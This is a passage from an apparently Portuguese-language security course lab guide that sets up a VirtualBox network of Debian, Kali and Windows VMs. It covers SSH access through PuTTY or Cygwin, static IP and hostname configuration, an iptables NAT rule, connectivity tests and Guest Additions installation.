<p><code>CTRL + X</code>: Fechar o <code>buffer</code> de arquivo atual (que pode ser um texto sendo editado, ou o painel de ajuda), e sair do <code>nano</code>. Para salvar o arquivo, digite <code>Y</code> (<em>yes</em>) ou <code>S</code> (<em>sim</em>) para confirmar as mudanças ao arquivo, opcionalmente altere o nome do arquivo a ser escrito no disco, e digite <code>ENTER</code>.</p>
</li>
<li>
<p><code>CTRL + O</code>: Salvar o arquivo no disco sem sair do editor.</p>
</li>
<li>
<p><code>CTRL + W</code>: Buscar padrão no texto.</p>
</li>
<li>
<p><code>CTRL + K</code>: Cortar uma linha inteira e salvar no <code>buffer</code> do editor.</p>
</li>
<li>
<p><code>CTRL + U</code>: Colar o <code>buffer</code> do editor na posição atual do cursor. Pode ser usado repetidamente.</p>
</li>
</ul>
</div>
</div>
</div>
<div class="paragraph">
<p>Para salvar e sair do texto sendo editado, como mencionado acima, utilize <code>CTRL + X</code>.</p>
</div>
</li>
<li>
<p>Durante as atividades deste curso iremos ter que digitar vários comandos no terminal das VMs, os quais serão mostrados nos cadernos de atividade de cada sessão. Alguns desses comandos serão bastante longos e/ou terão uma sintaxe complicada&#8201;&#8212;&#8201;nesse caso, o ideal é que tenhamos a possibilidade de copiá-los diretamente do caderno para a console, evitando erros de digitação.</p>
<div class="paragraph">
<p>O protocolo de login remoto SSH é ideal para solucionar essa tarefa. Em ambiente Windows, dois dos métodos mais populares para efetuar logins remotos via SSH são os programas PuTTY (<a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html" class="bare">https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html</a>) ou Cygwin (<a href="https://cygwin.com/install.html" class="bare">https://cygwin.com/install.html</a>). Vamos, primeiro, visualizar os passos necessários usando o PuTTY.</p>
</div>
<div class="paragraph">
<p>Em qualquer caso, o primeiro passo é sempre descobrir qual o endereço IP da máquina remota à qual queremos nos conectar. Por exemplo, na máquina <em>FWGW1-G</em>:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># ip a s enp0s3 | grep '^ *inet ' | awk '{print $2}' | cut -d'/' -f1
192.168.29.103</pre>
</div>
</div>
<div class="paragraph">
<p>O uso do <strong>PuTTY</strong>, por se tratar de um programa <em>standalone</em> com o objetivo único de efetuar login via SSH, é mais simples. Faça o download do PuTTY em sua máquina física Windows, usando a URL informada acima. Em seguida, apenas abra o programa e digite na caixa <em>Host Name</em> o endereço IP da máquina remota descoberto acima. Em seguida, clique em <em>Open</em>.</p>
</div>
<div id="img-ssh1" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/ssh1.png" alt="ssh1">
</div>
<div class="title">Figure 2. Login via SSH usando o PuTTY, parte 1</div>
</div>
<div class="paragraph">
<p>Será mostrado um alerta de segurança avisando que a chave do <em>host</em> remoto não se encontra na <em>cache</em> local, o que pode configurar um risco de segurança. Clique em <em>Yes</em> para prosseguir com a tentativa de login.</p>
</div>
<div class="paragraph">
<p>Em seguida, será solicitado o nome de usuário com o qual efetuar a conexão. Como, por padrão, o <em>daemon</em> <code>sshd</code> do Debian não permite logins remotos usando o <code>root</code>, escolha o usuário <code>aluno</code>. Para a senha, informe <code>rnpesr</code>. Em caso de sucesso, você verá a tela a seguir:</p>
</div>
<div id="img-ssh2" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/ssh2.png" alt="ssh2">
</div>
<div class="title">Figure 3. Login via SSH usando o PuTTY, parte 2</div>
</div>
<div class="paragraph">
<p>Para tornar-se o superusuário <code>root</code>, agora, basta executar o comando <code>su -</code> e informar a senha correta, como se segue:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>$ su -
Senha:</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># whoami
root</pre>
</div>
</div>
<div class="paragraph">
<p>Para copiar/colar comandos no PuTTY, basta selecionar o texto desejado no ambiente da máquina física e digitar <code>CTRL + C</code>, e em seguida clicar com o botão direito na janela do PuTTY. O texto selecionado será colado na posição do cursor.</p>
</div>
</li>
<li>
<p>O uso do Cygwin é um pouco mais envolvido, já que seu objetivo é mais complexo: prover, em ambiente Windows, funcionalidade equivalente à que temos disponível em uma distribuição Linux. Para começar, faça o download e execute o instalador do Cygwin em sua máquina física Windows.</p>
<div class="paragraph">
<p>A instalação é, em grande parte, bastante similar à de qualquer aplicativo Windows. Na tela inicial, clique em <em>Next</em>. Em <em>Choose a Download Source</em>, mantenha marcada a caixa <em>Install from Internet</em> e clique em <em>Next</em>. Em <em>Select Root Install Directory</em>, os valores padrão estão apropriados&#8201;&#8212;&#8201;clique em <em>Next</em>. Na tela <em>Select Local Package Directory</em>, novamente, mantenha o valor padrão e clique em <em>Next</em>.</p>
</div>
<div class="paragraph">
<p>Agora, vamos selecionar a fonte de pacotes. Em <em>Select Your Internet Connection</em>, a menos que haja um <em>proxy</em> na rede local (informe-se com seu instrutor), mantenha marcada a caixa <em>Direct Connection</em> e clique em <em>Next</em>. Será feito o download da lista de espelhos disponíveis para o Cygwin. Em <em>Choose A Download Site</em>, qualquer espelho irá funcionar, mas evidentemente é desejável que escolhamos um que possua maior velocidade de download&#8201;&#8212;&#8201;o site <a href="http://linorg.usp.br" class="bare">http://linorg.usp.br</a> é provavelmente uma boa opção, nesse caso. Clique em <em>Next</em>, e o instalador irá baixar a lista de pacotes disponíveis.</p>
</div>
<div class="paragraph">
<p>Em adição ao sistema-base padrão, é necessário instalar o OpenSSH para efetuar logins remotos. Na caixa de busca <em>Search</em>, no topo da tela, digite o termo de busca <code>openssh</code>. Expanda a árvore <code>Net</code> e clique na palavra <em>Skip</em> na linha do pacote <code>openssh: The OpenSSH server and client programs</code>&#8201;&#8212;&#8201;ela irá alterar para a versão a ser instalada, <code>7.9p1-1</code> no caso da figura mostrada abaixo:</p>
</div>
<div id="img-ssh3" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/ssh3.png" alt="ssh3">
</div>
<div class="title">Figure 4. Instalação do OpenSSH no Cygwin</div>
</div>
<div class="paragraph">
<p>Clique em <em>Next</em>. Em <em>Review and confirm changes</em>, verifique que o Cygwin irá instalar o OpenSSH e todas as demais dependências do sistema-base Linux, como o <em>shell</em> <code>bash</code> ou ferramentas como o <code>grep</code>, e clique em <em>Next</em>. O instalador irá fazer o download e instalação dos pacotes selecionados.</p>
</div>
<div class="paragraph">
<p>Concluído o processo, procure pelo programa <code>Cygwin Terminal</code> no menu iniciar da sua máquina física Windows, e execute-o. Agora, tente fazer login via SSH normalmente, como se estivesse em um <em>shell</em> Linux:</p>
</div>
<div id="img-ssh4" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/ssh4.png" alt="ssh4">
</div>
<div class="title">Figure 5. Login via SSH usando o Cygwin</div>
</div>
<div class="paragraph">
<p>Para copiar/colar comandos no Cygwin, basta selecionar o texto desejado no ambiente da máquina física e digitar <code>CTRL + C</code>, e em seguida mudar o foco para a janela do Cygwin e digitar a combinação <code>SHIFT + Insert</code>. Para copiar texto a partir da janela do Cygwin, selecione-o e use a combinação de teclas <code>CTRL + Insert</code>. Para encontrar os arquivos localizados em sua máquina física, o diretório <code>/cygdrive/X</code> pode ser usado para mapear para os discos da máquina local&#8201;&#8212;&#8201;por exemplo, o diretório <code>/cygdrive/c</code> mapeia diretamente para o <code>C:\</code> da máquina Windows.</p>
</div>
</li>
<li>
<p>Voltemos à configuração da rede. Ainda na máquina <em>FWGW1-G</em>, edite o arquivo <code>/etc/network/interfaces</code> como se segue, reinicie a rede e verifique o funcionamento:</p>
<div class="literalblock">
<div class="content">
<pre># hostname
FWGW1-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># whoami
root</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># nano /etc/network/interfaces
(...)</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># cat /etc/network/interfaces
source /etc/network/interfaces.d/*

auto lo enp0s3 enp0s8 enp0s9

iface lo inet loopback

iface enp0s3 inet dhcp

iface enp0s8 inet static
address 172.16.1.1/24

iface enp0s9 inet static
address 10.1.1.1/24</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># systemctl restart networking</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># ip a s | grep '^ *inet '
    inet 127.0.0.1/8 scope host lo
    inet 192.168.29.107/24 brd 192.168.29.255 scope global enp0s3
    inet 172.16.1.1/24 brd 172.16.1.255 scope global enp0s8
    inet 10.1.1.1/24 brd 10.1.1.255 scope global enp0s9</pre>
</div>
</div>
<div style="page-break-after: always;"></div>
</li>
<li>
<p>Se você for membro do grupo <code>B</code>, altere o nome de <em>host</em> da máquina <em>FWGW1-G</em> para refletir corretamente seu grupo. Primeiro, altere o arquivo <code>/etc/hostname</code>:</p>
<div class="literalblock">
<div class="content">
<pre># nano /etc/hostname
(...)</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># cat /etc/hostname
FWGW1-B</pre>
</div>
</div>
<div class="paragraph">
<p>Faça o mesmo com o arquivo <code>/etc/hosts</code>:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># nano /etc/hosts
(...)</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       FWGW1-B.intnet  FWGW1-B

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters</pre>
</div>
</div>
<div class="paragraph">
<p>Agora, reinicie a máquina. Após o login como usuário <code>root</code>, você deverá ver que o <em>prompt</em> do terminal mudou, como se segue:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>root@FWGW1-B:~# hostname
FWGW1-B</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># whoami
root</pre>
</div>
</div>
<div class="paragraph">
<p>Finalmente, vamos regerar as chaves de <em>host</em> do <code>ssh</code> com o novo <em>hostname</em>. Execute:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># rm /etc/ssh/ssh_host_*</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># dpkg-reconfigure openssh-server
Creating SSH2 RSA key; this may take some time ...
2048 SHA256:NyWM8WE7wv2rWpPMN/w115eq4UeflKOm+jFSsHQ/Zwk root@FWGW1-B (RSA)
Creating SSH2 ECDSA key; this may take some time ...
256 SHA256:ZPxXhAgsnAdTuEbppgsxERp5WQNbQuNROAtatszyrlA root@FWGW1-B (ECDSA)
Creating SSH2 ED25519 key; this may take some time ...
256 SHA256:YBEQfhMSNz6sKvyDu/mRjNB/njj6PAim7xaLmGrcDEM root@FWGW1-B (ED25519)</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># systemctl restart ssh</pre>
</div>
</div>
</li>
<li>
<p>Ligue a máquina <em>LinServer-G</em> e faça login como usuário <code>root</code> e senha <code>rnpesr</code>. Se encontrar problemas com o teclado, aplique a mesma solução utilizada na etapa (1) desta atividade. Para alterar o <em>hostname</em> da máquina, siga os passos da etapa (6).</p>
<div class="paragraph">
<p>A seguir, edite as configurações de rede no arquivo <code>/etc/network/interfaces</code>, de DNS no arquivo <code>/etc/resolv.conf</code>, reinicie a rede e verifique se tudo está funcionando:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># hostname
LinServer-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># whoami
root</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># nano /etc/network/interfaces
(...)</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># cat /etc/network/interfaces
source /etc/network/interfaces.d/*

auto lo enp0s3

iface lo inet loopback

iface enp0s3 inet static
address 172.16.1.10/24
gateway 172.16.1.1</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># nano /etc/resolv.conf
(...)</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># cat /etc/resolv.conf
nameserver 8.8.8.8
nameserver 8.8.4.4</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># systemctl restart networking</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># ip a s | grep '^ *inet '
    inet 127.0.0.1/8 scope host lo
    inet 172.16.1.10/24 brd 172.16.1.255 scope global enp0s3</pre>
</div>
</div>
<div style="page-break-after: always;"></div>
</li>
<li>
<p>Vamos para a máquina <em>WinServer-G</em>. Assim que a máquina terminar de ligar, deveremos definir uma senha para o usuário <code>Administrator</code> na tela <em>Customize settings</em>. Use uma senha forte, como <code>RnpEsr123!</code>:</p>
<div id="img-passwd-winserver" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/winserver-1.png" alt="winserver 1">
</div>
<div class="title">Figure 6. Definição de senha do administrador na máquina WinServer-G</div>
</div>
<div class="paragraph">
<p>Pelo <em>Control Panel</em> ou usando o comando <code>ncpa.cpl</code>, configure o endereço IP e servidores DNS de forma estática, como na foto abaixo, e verifique que suas configurações estão funcionais.</p>
</div>
<div id="img-rede-winserver" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/winserver-2.png" alt="winserver 2">
</div>
<div class="title">Figure 7. Configuração de rede da máquina WinServer-G</div>
</div>
<div class="paragraph">
<p>Quando perguntado se deseja que o computador possa ser descoberto por outros dispositivos na rede, responda <em>Yes</em>.</p>
</div>
<div id="img-discover-winserver" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/winserver-3.png" alt="winserver 3">
</div>
<div class="title">Figure 8. Descoberta de rede da máquina WinServer-G</div>
</div>
<div style="page-break-after: always;"></div>
</li>
<li>
<p>Prossiga para a máquina <em>KaliLinux-G</em>, e faça login como usuário <code>root</code> e senha <code>rnpesr</code>. Se encontrar problemas com o teclado, aplique a mesma solução utilizada na etapa (1) desta atividade, e reinicie a VM. Para alterar o <em>hostname</em> da máquina, siga os passos da etapa (4).</p>
<div class="paragraph">
<p>Em seguida, edite as configurações de rede no arquivo <code>/etc/network/interfaces</code> e de DNS no arquivo <code>/etc/resolv.conf</code>. Reinicie a rede e verifique se tudo está correto:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># hostname
KaliLinux-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># whoami
root</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># nano /etc/network/interfaces
(...)</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># cat /etc/network/interfaces
source /etc/network/interfaces.d/*

auto lo eth0

iface lo inet loopback

iface eth0 inet static
address 172.16.1.30/24
gateway 172.16.1.1</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># nano /etc/resolv.conf
(...)</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># cat /etc/resolv.conf
nameserver 8.8.8.8
nameserver 8.8.4.4</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># systemctl restart networking</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># ip a s | grep '^ *inet '
    inet 127.0.0.1/8 scope host lo
    inet 172.16.1.30/24 brd 172.16.1.255 scope global eth0</pre>
</div>
</div>
<div style="page-break-after: always;"></div>
</li>
<li>
<p>Finalmente, vamos configurar a máquina <em>WinClient-G</em>: o primeiro passo é concluir o processo de instalação, a começar pela escolha da região do sistema. Escolha <em>Brasil</em> e prossiga:</p>
<div id="img-region-winclient" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/winclient-1.png" alt="winclient 1">
</div>
<div class="title">Figure 9. Configuração de região da máquina WinClient-G</div>
</div>
<div class="paragraph">
<p>Em seguida, escolha o <em>layout</em> de teclado&#8201;&#8212;&#8201;provavelmente <code>Brasil-ABNT2</code>.</p>
</div>
<div id="img-keyboard-winclient" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/winclient-2.png" alt="winclient 2">
</div>
<div class="title">Figure 10. Configuração de teclado da máquina WinClient-G</div>
</div>
<div class="paragraph">
<p>Quando perguntado se deseja adicionar um segundo <em>layout</em> de teclado, escolha <em>Pular</em>.</p>
</div>
<div class="paragraph">
<p>A seguir, o sistema irá tentar conectar-se automaticamente à rede, sem sucesso. No canto inferior esquerdo, clique em <em>Ignorar por enquanto</em>&#8201;&#8212;&#8201;iremos configurar a rede posteriormente.</p>
</div>
<div id="img-prenetwork-winclient" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/winclient-4.png" alt="winclient 4">
</div>
<div class="title">Figure 11. Configuração preliminar de rede da máquina WinClient-G</div>
</div>
<div class="paragraph">
<p>O configurador irá pedir confirmação se você deseja prosseguir sem configurar a rede. Clique em <em>Não</em> para continuar com o processo de configuração inicial.</p>
</div>
<div class="paragraph">
<p>Agora, vamos criar uma conta de usuário. Escolha o nome <code>Aluno</code>:</p>
</div>
<div id="img-account-winclient" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/winclient-6.png" alt="winclient 6">
</div>
<div class="title">Figure 12. Configuração de conta da máquina WinClient-G</div>
</div>
<div class="paragraph">
<p>Para a senha, defina <code>rnpesr</code> e confirme na tela posterior:</p>
</div>
<div id="img-password-winclient" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/winclient-7.png" alt="winclient 7">
</div>
<div class="title">Figure 13. Configuração de senha da máquina WinClient-G</div>
</div>
<div class="paragraph">
<p>Agora o sistema irá solicitar a definição de três perguntas de segurança caso a senha seja esquecida. Defina qualquer conjunto de perguntas/respostas que preferir, e prossiga:</p>
</div>
<div id="img-questions-winclient" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/winclient-9.png" alt="winclient 9">
</div>
<div class="title">Figure 14. Configuração de perguntas secretas da máquina WinClient-G</div>
</div>
<div class="paragraph">
<p>Quando perguntado se deseja que a Cortana se torne sua assistente pessoal, desmarque a caixa <em>Permitir que a Cortana responda "Ei Cortana"</em> e clique em <em>Recusar</em>.</p>
</div>
<div id="img-assistant-winclient" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/winclient-10.png" alt="winclient 10">
</div>
<div class="title">Figure 15. Configuração de assistente da máquina WinClient-G</div>
</div>
<div class="paragraph">
<p>Quando perguntado se deseja ativar o histórico de atividades, responda <em>Não</em> e prossiga.</p>
</div>
<div class="paragraph">
<p>Na escolha de configurações de privacidade do sistema, desmarque todas as opções como mostrado na figura a seguir, e clique em <em>Aceitar</em>.</p>
</div>
<div id="img-privacy-winclient" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/winclient-12.png" alt="winclient 12">
</div>
<div class="title">Figure 16. Configuração de privacidade da máquina WinClient-G</div>
</div>
<div class="paragraph">
<p>Uma vez logado dentro do sistema, acesse o <em>Painel de Controle</em> ou use o comando <code>ncpa.cpl</code>, configure o endereço IP e servidores DNS de forma estática, como na foto abaixo, e verifique que suas configurações estão funcionais.</p>
</div>
<div id="img-rede-winclient" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/winclient-13.png" alt="winclient 13">
</div>
<div class="title">Figure 17. Configuração de rede da máquina WinClient-G</div>
</div>
<div class="paragraph">
<p>Quando perguntado se deseja que o computador possa ser descoberto por outros dispositivos na rede, responda <em>Sim</em>.</p>
</div>
<div id="img-discover-winclient" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/winclient-14.png" alt="winclient 14">
</div>
<div class="title">Figure 18. Descoberta de rede da máquina WinClient-G</div>
</div>
<div style="page-break-after: always;"></div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_6_configuração_de_firewall_e_nat">6) Configuração de firewall e NAT</h3>
<div class="paragraph">
<p>O próximo passo é garantir que as VMs consigam acessar a internet através da máquina <em>FWGW1-G</em>, que é o firewall/roteador na topologia de rede do curso.</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Antes de mais nada, observe que na máquina <em>FWGW1-G</em> já existe uma configuração de <em>masquerading</em> (um tipo de SNAT que veremos em maior detalhe na sessão 3) no arquivo <code>/etc/rc.local</code>:</p>
<div class="literalblock">
<div class="content">
<pre># hostname
FWGW1-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># cat /etc/rc.local
#!/bin/sh -e

iptables -t nat -A POSTROUTING -o enp0s3 -j MASQUERADE
exit 0</pre>
</div>
</div>
</li>
<li>
<p>Isto significa dizer que a tradução de endereços das redes privadas já está configurado. Verifique se o repasse de pacotes entre interfaces está habilitado&#8201;&#8212;&#8201;cheque se a linha <code>net.ipv4.ip_forward=1</code> no arquivo <code>/etc/sysctl.conf</code> está descomentada e, posteriormente, execute <code># sysctl -p</code>:</p>
<div class="literalblock">
<div class="content">
<pre># nano /etc/sysctl.conf
(...)</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># grep 'net.ipv4.ip_forward' /etc/sysctl.conf
net.ipv4.ip_forward=1</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># sysctl -p
net.ipv4.ip_forward = 1</pre>
</div>
</div>
</li>
<li>
<p>Verifique que o <em>masquerading</em> está de fato habilitado no firewall:</p>
<div class="literalblock">
<div class="content">
<pre># iptables -L POSTROUTING -vn -t nat
Chain POSTROUTING (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination
   23  1640 MASQUERADE  all  --  *      enp0s3  0.0.0.0/0            0.0.0.0/0</pre>
</div>
</div>
<div style="page-break-after: always;"></div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_7_teste_de_conectividade_das_vms">7) Teste de conectividade das VMs</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Vamos agora testar a conectividade de cada uma das VMs. Primeiro, acesse a máquina <em>FWGW1-G</em> e verifique o acesso à internet e resolução de nomes:</p>
<div class="literalblock">
<div class="content">
<pre>aluno@FWGW1-A:~$ hostname
FWGW1-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>aluno@FWGW1-A:~$ ping -c3 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=121 time=28.7 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=121 time=16.9 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=121 time=16.7 ms

--- 8.8.8.8 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2005ms
rtt min/avg/max/mdev = 16.776/20.832/28.757/5.606 ms</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>aluno@FWGW1-A:~$ ping -c3 esr.rnp.br
PING esr.rnp.br (200.130.99.56) 56(84) bytes of data.
64 bytes from 200.130.99.56: icmp_seq=1 ttl=54 time=37.9 ms
64 bytes from 200.130.99.56: icmp_seq=2 ttl=54 time=36.4 ms
64 bytes from 200.130.99.56: icmp_seq=3 ttl=54 time=37.1 ms

--- esr.rnp.br ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2004ms
rtt min/avg/max/mdev = 36.474/37.168/37.931/0.636 ms</pre>
</div>
</div>
</li>
<li>
<p>Em seguida, acesse cada uma das demais VMs, em ordem (<em>LinServer-G</em>, <em>WinServer-G</em>, <em>KaliLinux-G</em> e <em>WinClient-G</em>) e teste se é possível:</p>
<div class="openblock">
<div class="content">
<div class="ulist">
<ul>
<li>
<p>Alcançar o roteador da rede: <code>ping 172.16.1.1</code> (para máquinas da DMZ) ou <code>ping 10.1.1.1</code> (para máquinas da Intranet)</p>
</li>
<li>
<p>Alcançar um servidor na Internet: <code>ping 8.8.8.8</code></p>
</li>
<li>
<p>Resolver nomes: comandos <code>nslookup</code>, <code>host</code> ou <code>ping</code> para o nome de domínio <code>esr.rnp.br</code></p>
</li>
</ul>
</div>
</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_8_instalação_do_virtualbox_guest_additions_nas_vms_windows">8) Instalação do <strong><em>Virtualbox Guest Additions</em></strong> nas VMs Windows</h3>
<div class="paragraph">
<p>Vamos agora instalar os adicionais de convidado para máquinas virtuais do Virtualbox, conhecido como <em>Virtualbox Guest Additions</em>. Esse adicionais consistem em <em>drivers</em> de dispositivo e aplicações de sistema que otimizam o sistema para rodar no ambiente virtual, proporcionando maior performance e estabilidade. Nesta atividade, iremos instalar os adicionais nas máquinas <em>WinServer-G</em> e <em>WinClient-G</em>.</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Na console da máquina <em>WinServer-G</em>, acesse o menu <em>Devices</em> &gt; <em>Insert Guest Additions CD image</em>. Após algum tempo, a janela de <em>autorun</em> irá aparecer, como mostrado abaixo. Clique duas vezes na opção <em>Run VBoxWindowsAdditions.exe</em>.</p>
<div id="img-vboxguest-autorun" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/winserver-4.png" alt="winserver 4">
</div>
<div class="title">Figure 19. Janela de autorun do CD Virtualbox Guest Additions</div>
</div>
<div style="page-break-after: always;"></div>
</li>
<li>
<p>No assistente de instalação, clique em <em>Next</em>, <em>Next</em>, e finalmente em <em>Install</em>. No meio da instalação o sistema irá avisar que a assinatura de quem publicou o software não é conhecida. Marque a caixa <em>Always trust software from "Oracle Corporation"</em> e clique em <em>Install</em>, como mostrado abaixo.</p>
<div id="img-vboxguest-publisher" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/winserver-8.png" alt="winserver 8">
</div>
<div class="title">Figure 20. Aviso de publisher não verificado do Virtualbox Guest Additions</div>
</div>
</li>
<li>
<p>Ao final da instalação, o assistente irá solicitar que o computador seja reiniciado. Deixe a caixa <em>Reboot now</em> marcada e clique em <em>Finish</em>.</p>
<div id="img-vboxguest-reboot" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/winserver-9.png" alt="winserver 9">
</div>
<div class="title">Figure 21. Reiniciar sistema após instalação do Virtualbox Guest Additions</div>
</div>
</li>
<li>
<p>Após o reinício do sistema, maximize a janela do Virtualbox e faça login no sistema como o usuário <code>Administrator</code>. Observe que, agora, o <em>desktop</em> do Windows Server 2019 ocupa toda extensão do monitor, e não apenas uma pequena janela&#8201;&#8212;&#8201;indício de que a instalação do <em>Virtualbox Guest Additions</em> foi realizada com sucesso.</p>
<div class="paragraph">
<p>Caso queira confirmar o sucesso da instalação, abra o <em>Task Manager</em> (via <code>SHIFT + CTRL + ESC</code> ou pelo menu Iniciar do Windows) e navegue até a aba <em>Details</em>. Note que o serviço <code>VboxService.exe</code> deverá estar operando, como mostrado abaixo:</p>
</div>
<div id="img-vboxguest-service" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/winserver-10.png" alt="winserver 10">
</div>
<div class="title">Figure 22. Serviço do Virtualbox Guest Additions operacional</div>
</div>
</li>
<li>
<p>Repita o procedimento de instalação dos passos 1 - 4 na máquina <em>WinClient-G</em>.</p>
<div style="page-break-after: always;"></div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_9_instalação_do_virtualbox_guest_additions_nas_vms_linux">9) Instalação do <strong><em>Virtualbox Guest Additions</em></strong> nas VMs Linux</h3>
<div class="admonitionblock note">
<table>
<tr>
<td class="icon">
<i class="fa icon-note" title="Note"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Neste curso iremos utilizar imagens de máquina virtual que já possuem todos os pacotes necessários para realização do curso pré-instalados. Em um sistema Debian recém-preparado, no entanto, o administrador teria primeiramente que instalar os pacotes <code>build-essential</code> e <code>module-assistant</code>:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># apt-get install --no-install-recommends build-essential module-assistant</pre>
</div>
</div>
<div class="paragraph">
<p>Em seguida, deve-se instalar os <code>headers</code> do kernel em execução no sistema:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># m-a prepare</pre>
</div>
</div>
<div class="paragraph">
<p>Uma vez realizados os passos acima, pode-se proceder com os passos de instalação do <em>Virtualbox Guest Additions</em> explicados abaixo.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>A instalação do <em>Virtualbox Guest Additions</em> nas VMs Linux é um pouco diferente, mais manual. Siga os passos a seguir:</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Na console do Virtualbox da máquina <em>FWGW1-G</em>, acesse o menu <em>Devices</em> &gt; <em>Insert Guest Additions CD image</em>. Em seguida, monte o dispositivo:</p>
<div class="literalblock">
<div class="content">
<pre># mount /dev/cdrom /mnt/ &amp;&amp; cd /mnt</pre>
</div>
</div>
</li>
<li>
<p>Agora, execute o instalador do <em>Virtualbox Guest Additions</em>, com o comando:</p>
<div class="literalblock">
<div class="content">
<pre># sh VBoxLinuxAdditions.run
Verifying archive integrity... All good.
Uncompressing VirtualBox 6.0.4 Guest Additions for Linux........
VirtualBox Guest Additions installer
Copying additional installer modules ...
Installing additional modules ...
VirtualBox Guest Additions: Building the VirtualBox Guest Additions kernel modules.  This may take a while.
VirtualBox Guest Additions: To build modules for other installed kernels, run
VirtualBox Guest Additions:   /sbin/rcvboxadd quicksetup &lt;version&gt;
VirtualBox Guest Additions: Building the modules for kernel 4.9.0-8-amd64.
update-initramfs: Generating /boot/initrd.img-4.9.0-8-amd64
VirtualBox Guest Additions: Starting.</pre>
</div>
</div>
</li>
<li>
<p>Finalmente, reinicie a máquina. Após o <em>reboot</em>, verifique que os módulos do <em>Virtualbox Guest Additions</em> estão operacionais:</p>
<div class="literalblock">
<div class="content">
<pre># reboot</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># lsmod | grep '^vbox' | sort
vboxguest             327680  2 vboxsf
vboxsf                 45056  0
vboxvideo              36864  0</pre>
</div>
</div>
</li>
<li>
<p>Instale os módulos do <em>Virtualbox Guest Additions</em> na máquina <em>LinServer-G</em>. O procedimento é idêntico ao que fizemos nos passos 1 - 6.</p>
</li>
</ol>
</div>
<div style="page-break-after: always;"></div>
</div>
<div class="sect2">
<h3 id="_10_configuração_da_vm_winserver_g">10) Configuração da VM <strong><em>WinServer-G</em></strong></h3>
<div class="paragraph">
